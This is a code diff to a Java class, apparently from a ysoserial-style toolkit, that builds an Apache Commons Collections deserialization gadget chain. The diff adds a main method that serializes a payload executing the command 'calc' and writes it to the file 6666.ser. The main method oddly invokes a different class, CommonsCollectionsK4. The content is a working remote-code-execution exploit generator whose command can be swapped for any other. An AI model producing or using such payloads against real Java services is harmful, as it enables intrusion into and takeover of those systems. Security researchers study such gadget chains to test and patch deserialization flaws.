@@ -10,6 +10,7 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
+import java.io.FileOutputStream;
 import java.io.Serializable;
 import java.lang.reflect.Field;
 import java.util.HashMap;
@@ -84,5 +85,14 @@ public class CommonsCollections6 implements ObjectPayload<Serializable> {
         keyField.set(node, entry);
 
         return map;
+    }
+
+    public static void main(String[] args) throws Exception {
+        String           cmd    = "calc";
+        String[]         params = new String[]{cmd};
+        byte[]           bytes = (byte[]) CommonsCollectionsK4.class.getMethod("getObject", PayloadType.class, String[].class).invoke(CommonsCollectionsK4.class.newInstance(), PayloadType.nu1r, params);
+        FileOutputStream fous  = new FileOutputStream("6666.ser");
+        fous.write(bytes);
+        fous.close();
     }
 }
